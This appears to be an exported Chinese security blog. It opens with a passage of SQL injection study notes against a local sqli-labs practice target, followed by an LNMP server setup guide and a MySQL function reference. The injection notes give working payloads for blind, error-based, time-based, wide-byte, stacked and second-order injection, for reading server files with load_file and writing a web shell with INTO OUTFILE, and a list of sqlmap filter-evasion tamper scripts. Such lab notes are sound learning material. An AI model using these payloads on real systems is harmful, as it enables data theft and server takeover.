left(a,b)从左侧截取 a 的前 b 位 ▲ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 –+ //substr()函数， ascii()函数 Explain： substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度。 Ascii()将某个字符转换为 ascii 值 ▲ascii(substr((select database()),1,1))=98 ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDERBY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数， MID()函数 Explain： mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位Ord()函数同 ascii()， 将字符转为 ascii 值 ▲regexp 正则注入 存疑正则注入介绍用法介绍： select user() regexp ‘^[a-z]’;Explain： 正则表达式的用法， user()结果为 root， regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。 ▲like 匹配注入 和上述的正则类似， mysql 在匹配的时候我们可以用 ike 进行匹配。用法： select user() like ‘ro% 2： 基于报错的 SQL 盲注-构造 payload 让信息通过错误提示回显出来 存疑▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql 对 xml 数据进行查询和修改的 xpath 函数， xpath 语法错误▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;//mysql 重复特性， 此处重复了 version， 所以报错。 3:基于时间的 SQL 盲注–延时注入▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep IF表达式 1IF(expr1,expr2,expr3) 如果 expr1 是TRUE (expr1 &lt;&gt; 0 and expr1 &lt;&gt; NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。 布尔盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39;and left(version(),1)=5# 1） 利用 left(database(),1)进行尝试 查看 version()， 数据库的版本号为 10.1.36, 这句话的意思是查看版本号第一位是不是1， 明显的返回的结果是正确的 当版本号不正确的时候， 则不能正确显示 you are in…… http://127.0.0.1/sqllib/Less-5/?id=1 ‘and length(database())=8 –+ 判读数据库长度 猜测数据库第一位 继而猜测第二位 采用二分法 报错盲注演示http://127.0.0.1/sqllib/Less-5/?id=1&#39; union Select 1,count(),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)2))a from information_schema.columns group by a–+ 利用 double 数值类型超出范围进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (exp(~(select * FROM(SELECT USER())a))),2,3–+ 利用 bigint 溢出进行报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; union select (!(select * from (select user())x) - ~0),2,3--+ xpath 函数报错注入http://127.0.0.1/sqllib/Less-5/?id=1&#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e))–+ http://127.0.0.1/sqllib/Less-5/?id=1&#39; and updatexml(1,concat(0x7e,(select @@version),0x7e),1)–+ 利用数据的重复性http://127.0.0.1/sqllib/Less-5/?id=1&#39;union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x –+ 演示盲注演示http://127.0.0.1/sqllib/Less-5/?id=1’and if(ascii(substr(database(),1,1))=116,1,sleep(5))–+ 当错误的时候会有 5 秒的时间延时。 利用 BENCHMARK()进行延时注入 当结果正确的时候， 运行 ENCODE(‘MSG’,’by 5 seconds’)操作 50000000 次， 会占用一段时间。 http://127.0.0.1/sqllib/Less-5/?id=1&#39;UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE(‘MSG’,’by 5 seconds’)),null)),2,3 FROM (select database() as current) as tb1–+ 猜数据库： http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+ 说明第一位是 s （ascii 码是 115） http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第二位是 e （ascii 码是 101） 以此类推 猜出数据的名字是security 猜测 security 的数据表：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))–+猜测第一个数据表的第一位是 e,…依次类推， 得到 emails http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1))=114,1,sleep(5))–+猜测第二个数据表的第一位是 r,…依次类推， 得到 referers 以此类推， 我们可以得到所有的数据表 emails,referers,uagents,users 猜测users表的列 http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from informationschema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+猜测 users 表的第一个列的第一个字符是 i，以此类推， 我们得到列名是 id， username， password 猜测 username 的值：http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+猜测 username 的第一行的第一位以此类推， 我们得到数据库 username， password 的所有内容 文件的导入导出1、 load_file()导出文件Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。使用条件：A、 必须有权限读取并且文件必须完全可读and (select count() from mysql.user)&gt;0/ 如果结果返回正常,说明具有读写权限。and (select count() from mysql.user)&gt;0/ 返回错误， 应该是管理员给数据库帐户降权B、 欲读取文件必须在服务器上C、 必须指定文件完整的路径Mysql 注入—sqlilabs—lcamry30D、 欲读取文件必须小于 max_allowed_packet如果该文件不存在， 或因为上面的任一原因而不能被读出， 函数返回空。 比较难满足的就是权限， 在 windows 下， 如果 NTFS 设置得当， 是不能读取相关的文件的， 当遇到只有administrators 才能访问的文件， users 就别想 load_file 出来。在实际的注入中， 我们有两个难点需要解决：绝对物理路径构造有效的畸形语句 （报错爆出绝对路径）在很多 PHP 程序中， 当提交一个错误的 Query， 如果 display_errors = on， 程序就会暴露WEB 目录的绝对路径， 只要知道路径， 那么对于一个可以注入的 PHP 程序来说， 整个服务器的安全将受到严重的威胁。常用路径：http://www.cnblogs.com/lcamry/p/5729087.html示例： Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)))利用 hex()将文件内容导出来， 尤其是 smb 文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain： “char(99,58,47,98,111,111,116,46,105,110,105)” 就是“c:/boot.ini” 的 ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain： “c:/boot.ini” 的 16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\boot.ini)Explain:路径里的/用 \代替 2、 文件导入到数据库LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行， 并装入一个表中。 文件名称必须为一个文字字符串。 在注入过程中， 我们往往需要一些特殊的文件， 比如配置文件， 密码文件等。 当你具有数据库的权限时， 可以将系统文件利用 load data infile 导入到数据库中。 示例： load data infile ‘/tmp/t0.txt’ ignore into table t0 character set gbk fields terminated by ‘\t’lines terminated by ‘\n’ 将/tmp/t0.txt 导入到 t0 表中， character set gbk 是字符集设置为 gbk， fields terminated by 是每一项数据之间的分隔符， lines terminated by 是行的结尾符。 当错误代码是 2 的时候的时候， 文件不存在， 错误代码为 13 的时候是没有权限， 可以考虑/tmp 等文件夹。 3、 导入到文件SELECT…..INTO OUTFILE ‘file_name’ 可以把被选择的行写入一个文件中。 该文件被创建到服务器主机上， 因此您必须拥有 FILE权限， 才能使用此语法。 file_name 不能是一个已经存在的文件。 有两种形式： 第一种直接将 select 内容导入到文件中： Select version() into outfile “c:\phpnow\htdocs\test.php”此处将 version()替换成一句话， 也即Select into outfile “c:\phpnow\htdocs\test.php” 然后直接连一句话 第二种修改文件结尾：Select version() Into outfile “c:\phpnow\htdocs\test.php” LINES TERMINATED BY 0x16 进制文件 解释： 通常是用‘\r\n’ 结尾， 此处我们修改为自己想要的任何文件。 同时可以用 FIELDSTERMINATED BY16 进制可以为一句话或者其他任何的代码， 可自行构造。 在 sqlmap 中 os-shell 采取的就是这样的方式， 具体可参考 os-shell 分析文章： http://www.cnblogs.com/lcamry/p/5505110.html http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,3 into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.txt” –+ 写入一句话木马 http://127.0.0.1/sqllib/Less-7/?id=1’)) UNION SELECT 1,2,’‘ into outfile “E:\WEB\XMAPP\htdocs\sqllib\Less-7\test.php” –+ 后续就可以上菜刀了 POST 注入输入正确用户名和密码 提交 username 和 password 后， 后台形成的 sql 语句为 $sql=”SELECT username, password FROM users WHERE username=’admin’ and password=’$passwd’ LIMIT 0,1”; 万能密码: 用户名：admin’or’1’=’1# admin ‘ # 密码：密码随便输入 $sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and password=’$passwd’ LIMIT 0,1”; 猜测数据库第一位 uname=admin’and If(ascii(substr(database(),1,1))=115,1,sleep(5))#&amp;passwd=11&amp;submit=Submit 增删改函数介绍 增加一行数据 INSERT insert into users values(‘16’,’lcamry’,’lcamry’); 删除一行数据 ​ 修改一行数据 updata 表名 set 列名=’新的值， 非数字加单引号’ where id=6; HTTP 头部注入User-Agent 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’=’1 Referer 注入 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 cookie 注入 报错了 payload: ‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and ‘1’=’1 二次排序什么是二次排序：二次排序注入也成为存储型的注入， 就是将可能导致sql 注入的字符先存入到数据库中， 当再次调用这个恶意构造的字符时， 就可以出触发sql 注入。 二次排序注入思路： 黑客通过构造数据的形式， 在浏览器或者其他软件中提交 HTTP 数据报文请求到服务端进行处理， 提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。 服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。 黑客向服务端发送第二个与第一次不相同的请求数据信息。 服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服务端环境中执行。 服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功。 注册用户名为admin’# 密码为123的账号 登录用户名 admi’# 并修改密码 可以看到admin 密码被修改了 Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ ANDpassword=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’admin’ 利用注册的admin’# 修改密码时候从数据库提取该数据 造成了数据 命令拼接 宽字节注入mysql 在使用 GBK 编码的时候， 会认为两个字符为一个汉字， 例如%aa%5c 就是一个汉字（前一个 ascii 码大于 128 才能到汉字的范围） 。 我们在过滤 ’ 的时候， 往往利用的思路是将 ‘ 转换为 \’ 1、 %df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27， 我们在%5c%27 前面添加%df， 形成%df%5c%27， 而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此事%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 同时也就达到了我们的目的。2、 将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。 这也是 bypass 的一种方法。 get 型的方式我们是以 url 形式提交的， 因此数据会通过 URLencode post 型的注入当中， 将 utf-8 转换为 utf-16 或 utf-32， 例如将 ‘ 转为 utf-16 为 � ‘ 堆叠注入1、在 SQL 中， 分号（;） 是用来表示一条 sql 语句的结束。 2、在 ; 结束一个 sql语句后继续构造下一条语句就造就了堆叠注入。 3、与union injection（联合注入）的 区别就在于 union或者 union all 执行的语句类型是有限的， 可以用来执行查询语句， 而堆叠 注入可以执行的是任意的语句 堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，在我们的 web 系统中， 因为代码通常只返回一个查询结果， 因此， 堆叠注入第二个语句产生错误或者结果只能被忽略， 我们在前端界面是无法看到返回结果的。因此， 在读取数据时，建议使用 union（联合） 注入。 同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的， 例如表名， 列名等信息 PS：oracle 不能使用堆叠注入， 当有两条语句在同一行时， 直接报错。 无效字符。 堆叠注入payload： http://127.0.0.1/sqli-labs/Less-38/index.php?id=1%27;insert into users(id,username,password) values (‘39’,’less39’,’hello’)–+ Tamper详解原始注入遇到困难时，可尝试加载相应脚本，进行绕过用法： –tamper**“脚本名称”(可使用多个tamper) sqlmap版本1.2.7.20，共有57个tamper脚本 序号 脚本名称 注释 1 0x2char 将每个编码后的字符转换为等价表达 2 apostrophemask 单引号替换为Utf8字符，用于过滤单引号 3 apostrophenullencode 替换双引号为%00%27 4 appendnullbyte 有效代码后添加%00 5 base64encode 使用base64编码 6 between 比较符替换为between 7 bluecoat 空格替换为随机空白字符，等号替换为like 8 chardoubleencode 双url编码 9 charencode 将url编码(不处理已经编码的字符) 10 charunicodeencode 使用unicode编码 11 charunicodeescape 以指定的payload反向编码未编码的字符 12 commalesslimit 改变limit语句的写法 13 commalessmid 改变mid语句的写法 14 commentbeforeparentheses 在括号前加内联注释 15 concat2concatws 替换CONCAT为CONCAT_WS 16 equaltolike 等号替换为like 17 escapequotes 双引号替换为\ 18 greatest 大于号替换为greatest，绕过对&gt;的过滤 19 halfversionedmorekeywords 在每个关键字前加注释 20 htmlencode html编码所有非字母和数字的字符 21 ifnull2casewhenisnull 改变ifnull语句的写法 22 ifnull2ifisnull 替换ifnull为if(isnull(A)) 23 informationschemacomment 标示符后添加注释 24 least 替换大于号为least 25 lowercase 全部替换为小写值 26 modsecurityversioned 空格替换为查询版本的注释 27 modsecurityzeroversioned 添加完整的查询版本的注释 28 multiplespaces 添加多个空格 29 nonrecursivereplacement 替换预定义的关键字 30 overlongutf8 将所有字符转义为utf8 31 overlongutf8more 以指定的payload转换所有字符 32 percentage 每个字符前添加% 33 plus2concat 将加号替换为concat函数 34 plus2fnconcat 将加号替换为ODBC函数{fn CONCAT()} 35 randomcase 字符大小写随机替换 36 randomcomments /**/分割关键字 37 securesphere 添加某字符串 38 sp_password 追加sp_password字符串 39 space2comment 空格替换为/**/ 40 space2dash 空格替换为–加随机字符 41 space2hash 空格替换为#加随机字符 42 space2morecomment 空格替换为/_/ 43 space2morehash 空格替换为#加随机字符及换行符 44 space2mssqlblank 空格替换为其他空符号 45 space2mssqlhash 空格替换为%23%0A 46 space2mysqlblank 空格替换为其他空白符号 47 space2mysqldash 空格替换为–%0A 48 space2plus 空格替换为加号 49 space2randomblank 空格替换为备选字符集中的随机字符 50 symboliclogical AND和OR替换为&amp;&amp;和\ \ 51 unionalltounion union all select替换为union select 52 unmagicquotes 宽字符绕过GPC 53 uppercase 全部替换为大写值 54 varnish 添加HTTP头 55 versionedkeywords 用注释封装每个非函数的关键字 56 versionedmorekeywords 使用注释绕过 57 xforwardedfor 添加伪造的HTTP头 脚本base64encode.py内容 –dbs –base64encode.py 参考资料：SQL注入回顾篇(四)/#权限常用参数 sqli-SQL注入总结]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2FLNMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建Ubuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择 最小安装 格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证]]></content>
  </entry>
  <entry>
    <title><![CDATA[数据库系统功能相关学习]]></title>
    <url>%2F2019%2F08%2F22%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[目标1 学习数据库自带函数的功能语法（思考在什么情况下可以执行命令） 2 将所有涉及的函数进行测试并且举例说明其用法并形成报告 拓展学习：针对自己所选数据库，尝试执行系统命令，自己构造所需环境 MySQL 字符串函数函数 描述 1 ASCII(s) 返回字符串 s 的第一个字符的 ASCII 码。 2 CHAR_LENGTH(s) 返回字符串 s 的字符数 CHARACTER_LENGTH(s) 返回字符串 s 的字符数 3 CONCAT(s1,s2…sn) 字符串 s1,s2 等多个字符串合并为一个字符串合并多个字符串 4 LOCATE(s1,s) 从字符串 s 中获取 s1 的开始位置 5LCASE(s) 将字符串 s 的所有字母变成小写字母LOWER(s) 将字符串 s 的所有字母变成小写字母 6LEFT(s,n) 返回字符串 s 的前 n 个字符 7 LPAD(s1,len,s2) 在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len 7 REPEAT(s,n) 将字符串 s 重复 n 次 8 REVERSE(s) 将字符串s的顺序反过来 9 RIGHT(s,n) 返回字符串 s 的后 n 个字符 10 RPAD(s1,len,s2) 在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len 11 SPACE(n) 返回 n 个空格返回 10 个空格： SELECT SPACE(10); 12 STRCMP(s1,s2) 比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1 12 SUBSTR(s, start, length) 从字符串 s 的 start 位置截取长度为 length 的子字符串 13 TRIM(s) 去掉字符串 s 开始和结尾处的空格 14 UCASE(s) 将字符串转换为大写​ UPPER(s) 将字符串转换为大写 MySQL 数字函数15 ABS(x) 返回 x 的绝对值 16 AVG(expression) 返回一个表达式的平均值，expression 是一个字段 函数名 描述 实例 ABS(x) 返回 x 的绝对值 返回 -1 的绝对值： SELECT ABS(-1) -- 返回1 ACOS(x) 求 x 的反余弦值(参数是弧度) SELECT ACOS(0.25); ASIN(x) 求反正弦值(参数是弧度) SELECT ASIN(0.25); ATAN(x) 求反正切值(参数是弧度) SELECT ATAN(2.5); ATAN2(n, m) 求反正切值(参数是弧度) SELECT ATAN2(-0.8, 2); AVG(expression) 返回一个表达式的平均值，expression 是一个字段 返回 Products 表中Price 字段的平均值： SELECT AVG(Price) AS AveragePrice FROM Products; CEIL(x) 返回大于或等于 x 的最小整数 SELECT CEIL(1.5) -- 返回2 CEILING(x) 返回大于或等于 x 的最小整数 SELECT CEIL(1.5) -- 返回2 COS(x) 求余弦值(参数是弧度) SELECT COS(2); COT(x) 求余切值(参数是弧度) SELECT COT(6); COUNT(expression) 返回查询的记录总数，expression 参数是一个字段或者 * 号 返回 Products 表中 products 字段总共有多少条记录： SELECT COUNT(ProductID) AS NumberOfProducts FROM Products; DEGREES(x) 将弧度转换为角度 SELECT DEGREES(3.1415926535898) -- 180 n DIV m 整除，n 为被除数，m 为除数 计算 10 除于 5： SELECT 10 DIV 5; -- 2 EXP(x) 返回 e 的 x 次方 计算 e 的三次方： SELECT EXP(3) -- 20.085536923188 FLOOR(x) 返回小于或等于 x 的最大整数 小于或等于 1.5 的整数： SELECT FLOOR(1.5) -- 返回1 GREATEST(expr1, expr2, expr3, …) 返回列表中的最大值 返回以下数字列表中的最大值： SELECT GREATEST(3, 12, 34, 8, 25); -- 34 返回以下字符串列表中的最大值：SELECT GREATEST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;); -- Runoob LEAST(expr1, expr2, expr3, …) 返回列表中的最小值 返回以下数字列表中的最小值： SELECT LEAST(3, 12, 34, 8, 25); -- 3 返回以下字符串列表中的最小值：SELECT LEAST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;); -- Apple LN 返回数字的自然对数 返回 2 的自然对数： SELECT LN(2); -- 0.6931471805599453 LOG(x) 返回自然对数(以 e 为底的对数) SELECT LOG(20.085536923188) -- 3 LOG10(x) 返回以 10 为底的对数 SELECT LOG10(100) -- 2 LOG2(x) 返回以 2 为底的对数 返回以 2 为底 6 的对数： SELECT LOG2(6); -- 2.584962500721156 MAX(expression) 返回字段 expression 中的最大值 返回数据表 Products 中字段 Price 的最大值： SELECT MAX(Price) AS LargestPrice FROM Products; MIN(expression) 返回字段 expression 中的最小值 返回数据表 Products 中字段 Price 的最小值： SELECT MIN(Price) AS LargestPrice FROM Products; MOD(x,y) 返回 x 除以 y 以后的余数 5 除于 2 的余数： SELECT MOD(5,2) -- 1 PI() 返回圆周率(3.141593） SELECT PI() --3.141593 POW(x,y) 返回 x 的 y 次方 2 的 3 次方： SELECT POW(2,3) -- 8 POWER(x,y) 返回 x 的 y 次方 2 的 3 次方： SELECT POWER(2,3) -- 8 RADIANS(x) 将角度转换为弧度 180 度转换为弧度： SELECT RADIANS(180) -- 3.1415926535898 RAND() 返回 0 到 1 的随机数 SELECT RAND() --0.93099315644334 ROUND(x) 返回离 x 最近的整数 SELECT ROUND(1.23456) --1 SIGN(x) 返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1 SELECT SIGN(-10) -- (-1) SIN(x) 求正弦值(参数是弧度) SELECT SIN(RADIANS(30)) -- 0.5 SQRT(x) 返回x的平方根 25 的平方根： SELECT SQRT(25) -- 5 SUM(expression) 返回指定字段的总和 计算 OrderDetails 表中字段 Quantity 的总和： SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails; TAN(x) 求正切值(参数是弧度) SELECT TAN(1.75); -- -5.52037992250933 TRUNCATE(x,y) 返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入） SELECT TRUNCATE(1.23456,3) -- 1.234 MySQL 日期函数 函数名 描述 实例 ADDDATE(d,n) 计算起始日期 d 加上 n 天的日期 SELECT ADDDATE(&quot;2017-06-15&quot;, INTERVAL 10 DAY); -&gt;2017-06-25 ADDTIME(t,n) 时间 t 加上 n 秒的时间 SELECT ADDTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:16 (秒) CURDATE() 返回当前日期 SELECT CURDATE(); -&gt; 2018-09-19 CURRENT_DATE() 返回当前日期 SELECT CURRENT_DATE(); -&gt; 2018-09-19 CURRENT_TIME 返回当前时间 SELECT CURRENT_TIME(); -&gt; 19:59:02 CURRENT_TIMESTAMP() 返回当前日期和时间 SELECT CURRENT_TIMESTAMP() -&gt; 2018-09-19 20:57:43 CURTIME() 返回当前时间 SELECT CURTIME(); -&gt; 19:59:02 DATE() 从日期或日期时间表达式中提取日期值 SELECT DATE(&quot;2017-06-15&quot;); -&gt; 2017-06-15 DATEDIFF(d1,d2) 计算日期 d1-&gt;d2 之间相隔的天数 SELECT DATEDIFF(&#39;2001-01-01&#39;,&#39;2001-02-02&#39;) -&gt; -32 DATE_ADD(d，INTERVAL expr type) 计算起始日期 d 加上一个时间段后的日期 SELECT ADDDATE(&#39;2011-11-11 11:11:11&#39;,1) -&gt; 2011-11-12 11:11:11 (默认是天) SELECT ADDDATE(&#39;2011-11-11 11:11:11&#39;, INTERVAL 5 MINUTE) -&gt; 2011-11-11 11:16:11 (TYPE的取值与上面那个列出来的函数类似) DATE_FORMAT(d,f) 按表达式 f的要求显示日期 d SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) -&gt; 2011-11-11 11:11:11 AM DATE_SUB(date,INTERVAL expr type) 函数从日期减去指定的时间间隔。 Orders 表中 OrderDate 字段减去 2 天： SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders DAY(d) 返回日期值 d 的日期部分 SELECT DAY(&quot;2017-06-15&quot;); -&gt; 15 DAYNAME(d) 返回日期 d 是星期几，如 Monday,Tuesday SELECT DAYNAME(&#39;2011-11-11 11:11:11&#39;) -&gt;Friday DAYOFMONTH(d) 计算日期 d 是本月的第几天 SELECT DAYOFMONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 DAYOFWEEK(d) 日期 d 今天是星期几，1 星期日，2 星期一，以此类推 SELECT DAYOFWEEK(&#39;2011-11-11 11:11:11&#39;) -&gt;6 DAYOFYEAR(d) 计算日期 d 是本年的第几天 SELECT DAYOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt;315 EXTRACT(type FROM d) 从日期 d 中获取指定的值，type 指定返回的值。 type可取值为： MICROSECOND SECOND MINUTE HOUR DAY WEEK MONTH QUARTER YEAR SECOND_MICROSECOND MINUTE_MICROSECOND MINUTE_SECOND HOUR_MICROSECOND HOUR_SECOND HOUR_MINUTE DAY_MICROSECOND DAY_SECOND DAY_MINUTE DAY_HOUR YEAR_MONTH SELECT EXTRACT(MINUTE FROM &#39;2011-11-11 11:11:11&#39;) -&gt; 11 FROM_DAYS(n) 计算从 0000 年 1 月 1 日开始 n 天后的日期 SELECT FROM_DAYS(1111) -&gt; 0003-01-16 HOUR(t) 返回 t 中的小时值 SELECT HOUR(&#39;1:2:3&#39;) -&gt; 1 LAST_DAY(d) 返回给给定日期的那一月份的最后一天 SELECT LAST_DAY(&quot;2017-06-20&quot;); -&gt; 2017-06-30 LOCALTIME() 返回当前日期和时间 SELECT LOCALTIME() -&gt; 2018-09-19 20:57:43 LOCALTIMESTAMP() 返回当前日期和时间 SELECT LOCALTIMESTAMP() -&gt; 2018-09-19 20:57:43 MAKEDATE(year, day-of-year) 基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期 SELECT MAKEDATE(2017, 3); -&gt; 2017-01-03 MAKETIME(hour, minute, second) 组合时间，参数分别为小时、分钟、秒 SELECT MAKETIME(11, 35, 4); -&gt; 11:35:04 MICROSECOND(date) 返回日期参数所对应的微秒数 SELECT MICROSECOND(&quot;2017-06-20 09:34:00.000023&quot;); -&gt; 23 MINUTE(t) 返回 t 中的分钟值 SELECT MINUTE(&#39;1:2:3&#39;) -&gt; 2 MONTHNAME(d) 返回日期当中的月份名称，如 Janyary SELECT MONTHNAME(&#39;2011-11-11 11:11:11&#39;) -&gt; November MONTH(d) 返回日期d中的月份值，1 到 12 SELECT MONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11 NOW() 返回当前日期和时间 SELECT NOW() -&gt; 2018-09-19 20:57:43 PERIOD_ADD(period, number) 为 年-月 组合日期添加一个时段 SELECT PERIOD_ADD(201703, 5); -&gt; 201708 PERIOD_DIFF(period1, period2) 返回两个时段之间的月份差值 SELECT PERIOD_DIFF(201710, 201703); -&gt; 7 QUARTER(d) 返回日期d是第几季节，返回 1 到 4 SELECT QUARTER(&#39;2011-11-11 11:11:11&#39;) -&gt; 4 SECOND(t) 返回 t 中的秒钟值 SELECT SECOND(&#39;1:2:3&#39;) -&gt; 3 SEC_TO_TIME(s) 将以秒为单位的时间 s 转换为时分秒的格式 SELECT SEC_TO_TIME(4320) -&gt; 01:12:00 STR_TO_DATE(string, format_mask) 将字符串转变为日期 SELECT STR_TO_DATE(&quot;August 10 2017&quot;, &quot;%M %d %Y&quot;); -&gt; 2017-08-10 SUBDATE(d,n) 日期 d 减去 n 天后的日期 SELECT SUBDATE(&#39;2011-11-11 11:11:11&#39;, 1) -&gt;2011-11-10 11:11:11 (默认是天) SUBTIME(t,n) 时间 t 减去 n 秒的时间 SELECT SUBTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:06 (秒) SYSDATE() 返回当前日期和时间 SELECT SYSDATE() -&gt; 2018-09-19 20:57:43 TIME(expression) 提取传入表达式的时间部分 SELECT TIME(&quot;19:30:10&quot;); -&gt; 19:30:10 TIME_FORMAT(t,f) 按表达式 f 的要求显示时间 t SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) 11:11:11 AM TIME_TO_SEC(t) 将时间 t 转换为秒 SELECT TIME_TO_SEC(&#39;1:12:00&#39;) -&gt; 4320 TIMEDIFF(time1, time2) 计算时间差值 SELECT TIMEDIFF(&quot;13:10:11&quot;, &quot;13:10:10&quot;); -&gt; 00:00:01 TIMESTAMP(expression, interval) 单个参数时，函数返回日期或日期时间表达式；有2个参数时，将参数加和 SELECT 